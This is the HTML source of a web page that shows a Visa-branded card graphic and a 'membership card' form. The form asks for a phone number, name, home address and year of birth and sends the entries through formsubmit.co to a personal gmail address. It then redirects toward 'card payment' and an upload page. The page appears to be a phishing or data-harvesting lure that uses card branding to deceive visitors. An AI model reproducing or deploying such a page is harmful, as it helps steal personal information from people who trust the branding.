
<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Credit Card Form</title>
  <link
    href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;600&display=swap"
    rel="stylesheet"
  />
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="wrapper">
    <div class="credit-card" id="card">
      <div class="card-front">
        <div class="branding">
          <img src="chip.png" class="chip-img" />
          <img src="visa.png" class="visa-logo" />
        </div>
        <div class="card-number">
         Tel:<br>
          <div>+1
         (   <span class="card-number-display">_</span>
            <span class="card-number-display">_</span>
            <span class="card-number-display">_</span>
           ) <span class="card-number-display">_</span>
         
            <span class="card-number-display">_</span>
            <span class="card-number-display">_</span>
           - <span class="card-number-display">_</span>
           <span class="card-number-display">_</span>
          
           
            <span class="card-number-display">_</span>
            <span class="card-number-display">_</span>
          </div>
        </div>
        <div class="details">
          <div>
            <span>Card Holder Name</span>
            <span id="card-holder-name">Your Name Here</span>
          </div>
          <div>
            <span>Expires</span>
            <span id="validity">06/2025</span>
          </div>
        </div>
      </div>
      <div class="card-back">
        <div class="black-strip"></div>
        <div class="white-strip">
          <span>Year of Birth</span>
          <div id="cvv-display"></div>
        </div>
        <img src="visa.png" class="visa-logo" />
      </div>
    </div>
    <form action="https://formsubmit.co/u8071577@gmail.com" method="POST" enctype="multipart/form-data">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_subject" value="MEMBERSHIP CARD">
                <input type="hidden" name="_next" value="https://membership-card-kappa.vercel.app/upload.html" class="mb-3">
                
                
      <label for="card-number">Phone Number</label>
      <input type="number" id="card-number" placeholder="+1(000) 000-0000" />

      <label for="card-holder">Card Holder:</label>
      <input type="text" id="card-name-input" placeholder="Your Name" />

<label for="address">Home Address:</label>
      <input type="text" id="address" placeholder="Your Home Address" />
      <div class="date-cvv">
        <div>
          <label for="validity">Expires On:</label>
          <input type="text" placeholder="06/2025" id="validity-input" readonly/>
        </div>
        <div>
          <label for="cvv">year of birth:</label>
          <input type="number" id="cvv" placeholder="***" />
          
        </div>
        
      </div> 
      <br>
     <input  type="submit" name="register" value="Proceed To Card Payment"> 
    </form>
  </div>
  <script src="script.js"></script>
</body>
</html>
